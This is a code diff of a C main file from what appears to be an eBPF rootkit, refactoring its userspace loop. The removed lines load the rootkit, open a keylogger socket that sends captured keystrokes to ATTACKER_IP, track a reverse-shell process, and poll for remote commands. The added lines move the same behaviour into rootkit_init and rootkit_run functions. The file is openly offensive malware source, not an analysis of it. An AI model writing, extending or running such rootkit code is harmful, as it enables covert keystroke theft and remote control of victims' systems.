@@ -1,61 +1,27 @@
-#include <bpf/libbpf.h>
-#include <errno.h>
-#include <linux/types.h>
+#include "userspace/rootkit.h"
+#include <signal.h>
 #include <stdio.h>
 
-#include "config.h"
-#include "rootkit.skel.h"
-#include "userspace/command_processor.h"
-#include "userspace/hider.h"
-#include "userspace/keylogger_processor.h"
-#include "userspace/loader.h"
+static application_context_t g_rootkit;
 
-#define RING_BUFF_POLL_TIMEOUT_MS 100
+static void handle_signal(int sig) {
+    (void)sig;
+    g_rootkit.running = false;
+}
 
 int main(int argc, char *argv[]) {
     (void)argc;
-    struct rootkit *skel;
 
-    skel = loader_load_rootkit();
-    if (!skel)
-        return -EINVAL;
+    signal(SIGINT, handle_signal);
+    signal(SIGTERM, handle_signal);
 
-    application_context_t application_ctx = {
-        .skel = skel,
-        .executable_name = argv[0],
-        .reverse_shell_pid = -1,
-    };
-
-    keylogger_context_t keylog_ctx = {
-        .keylogger_socket_fd = keylogger_processor_init_sender_socket(ATTACKER_IP, KEYLOGGER_PORT),
-    };
-
-    struct ring_buffer *command_event_rb =
-        ring_buffer__new(bpf_map__fd(skel->maps.events), command_processor_handle_received_command,
-                         &application_ctx, NULL);
-    if (!command_event_rb) {
-        loader_unload_rootkit(skel);
-        return -ENOMEM;
+    if (rootkit_init(&g_rootkit, argv[0]) < 0) {
+        perror("Failed to initialize");
+        return 1;
     }
 
-    struct ring_buffer *keylog_event_rb = ring_buffer__new(
-        bpf_map__fd(skel->maps.keylog_events), keylogger_processor_process_event, &keylog_ctx, NULL);
-    if (!keylog_event_rb) {
-        loader_unload_rootkit(skel);
-        return -ENOMEM;
-    }
+    int err = rootkit_run(&g_rootkit);
 
-    while (1) {
-
-        if (keylog_ctx.keylogger_socket_fd < 0)
-            keylog_ctx.keylogger_socket_fd =
-                keylogger_processor_init_sender_socket(ATTACKER_IP, KEYLOGGER_PORT);
-
-        ring_buffer__poll(keylog_event_rb, RING_BUFF_POLL_TIMEOUT_MS);
-        ring_buffer__poll(command_event_rb, RING_BUFF_POLL_TIMEOUT_MS);
-    }
-
-    loader_unload_rootkit(skel);
-
-    return 0;
+    rootkit_cleanup(&g_rootkit);
+    return err;
 }
